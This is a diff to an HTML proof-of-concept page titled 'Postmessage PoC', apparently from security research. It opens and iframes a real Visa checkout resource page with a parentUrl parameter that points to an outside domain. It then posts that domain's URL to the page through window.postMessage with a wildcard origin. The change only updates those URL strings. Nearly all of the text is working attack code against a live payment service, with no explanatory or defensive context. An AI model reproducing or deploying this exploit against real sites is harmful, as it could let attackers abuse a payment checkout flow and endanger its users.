@@ -7,15 +7,15 @@
                 <title>Postmessage PoC</title>
                 <script>
                     function pocLink() {
-                        let win = window.open('https://secure.checkout.visa.com/resources/html/cookie_health/cookie_ready.html?parentUrl=https://xsnapfish.com/visa');
-                        let msg = "fz9f7geb0-";
+                        let win = window.open('https://secure.checkout.visa.com/resources/html/cookie_health/cookie_ready.html?parentUrl=https://xsnapfish.com/visa.html');
+                        let msg = "https://xsnapfish.com/visa.html";
                         
                         setTimeout(function(){
                             win.postMessage(msg, '*');
                         }, 5000);
                     }
                     function pocFrame(win) {           
-                        let msg = "https://xsnapfish.com/visa-";
+                        let msg = "https://xsnapfish.com/visa.html";
                         
                         win.postMessage(msg, '*');          
                     }
@@ -23,7 +23,7 @@
             </head>
             <body>
                 <a href="#" onclick="pocLink();">PoC link</a>          
-                <iframe src="https://secure.checkout.visa.com/resources/html/cookie_health/cookie_ready.html?parentUrl=https://xsnapfish.com/visa" onload="pocFrame(this.contentWindow)"></iframe>                    
+                <iframe src="https://secure.checkout.visa.com/resources/html/cookie_health/cookie_ready.html?parentUrl=https://xsnapfish.com/visa.html" onload="pocFrame(this.contentWindow)"></iframe>                    
             </body>
         </html>
         
